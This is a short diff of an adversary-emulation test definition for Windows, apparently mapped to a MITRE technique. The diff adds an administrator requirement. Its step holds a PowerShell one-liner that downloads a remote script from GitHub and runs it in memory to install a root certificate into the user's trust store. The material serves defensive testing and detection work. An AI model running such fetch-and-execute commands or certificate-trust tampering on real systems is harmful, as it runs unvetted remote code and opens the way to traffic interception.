@@ -15,6 +15,7 @@ mitre:
 requirements:
     platforms:
         - os: windows
+    superuser: true
 steps:
     - name: add-root-certificate-to-currentuser-certificate-store
       inline: "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n"
